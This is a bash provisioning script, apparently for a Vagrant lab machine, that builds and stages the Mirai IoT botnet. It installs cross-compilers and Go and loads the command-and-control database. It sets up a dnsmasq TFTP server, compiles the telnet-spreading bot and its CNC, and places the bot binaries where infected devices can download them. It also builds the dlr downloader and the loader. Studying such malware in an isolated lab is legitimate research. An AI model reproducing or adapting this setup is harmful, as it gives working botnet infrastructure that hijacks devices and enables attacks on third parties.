#!/usr/bin/env bash

#apt-get update
#add-apt-repository ppa:longsleep/golang-backports
#apt update
apt-get install -y git gcc  electric-fence mysql-server mysql-client duende
snap install --classic --channel=1.13/stable go

ROOT="/home/vagrant"

if [ ! -d $ROOT/xcompilers ]; then
  echo "xcompiles not imported"
  exit 5
fi

cd "/home/vagrant/xcompilers" || exit 5
for filename in *.tar.bz2; do
  tar -jxf "${filename}"
  echo "export PATH=\$PATH:$ROOT/xcompile/$filename/bin" >>~/.mirairc
  echo ">> Compiler $filename installed"
done

echo "export PATH=\$PATH:/usr/local/go/bin" >>~/.mirairc
echo "export GOPATH=\$HOME/go" >>~/.mirairc
echo "source ~/.mirairc" >>~/.bashrc

#  echo ">>> Installing crosscompilers..."
#  mkdir -p "$ROOT"/mirai_root/xcompile
#  cd "$ROOT"/mirai_root/xcompile || exit 5
#
#  COMPILERS="cross-compiler-armv4l cross-compiler-i586 cross-compiler-m68k cross-compiler-mips cross-compiler-mipsel cross-compiler-powerpc cross-compiler-sh4 cross-compiler-sparc"
#
#  for compiler in $COMPILERS; do
#    wget -q https://www.uclibc.org/downloads/binaries/0.9.30.1/"${compiler}".tar.bz2 --no-check-certificate
#    if [ -f "${compiler}.tar.bz2" ]; then
#      tar -jxf "${compiler}".tar.bz2
#      rm "${compiler}".tar.bz2
#      echo "export PATH=\$PATH:$ROOT/mirai_root/xcompile/$compiler/bin" >>~/.mirairc
#      echo ">> Compiler $compiler installed"
#    else
#      echo "!> Can not download $compiler"
#    fi
#  done

echo "Reloading mirairc..."
source ~/.mirairc

echo "Getting go requirements..."
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

echo "Configure sql db"
mysql < $ROOT/mirai_root/scripts/db.sql

echo "Configuring dnsmasq..."
mkdir -p /server/tftp
killall dnsmasq || true
cp $ROOT/mirai_root/scripts/dnsmasq.conf /etc/dnsmasq.conf
dnsmasq

echo "Building mirai bot and cnc..."
cd $ROOT/mirai_root/mirai || exit 5
chmod g+x build.sh
./build.sh release telnet
cp $ROOT/mirai_root/mirai/release/mirai* /server/tftp/

echo "Building dlr..."
cd $ROOT/mirai_root/dlr || exit 5
chmod g+x build.sh
./build.sh
cp $ROOT/mirai_root/dlr/release/* $ROOT/mirai_root/loader/bins/

echo "Building loader..."
cd $ROOT/mirai_root/loader || exit 5
chmod g+x build.sh
./build.sh

echo "Done"
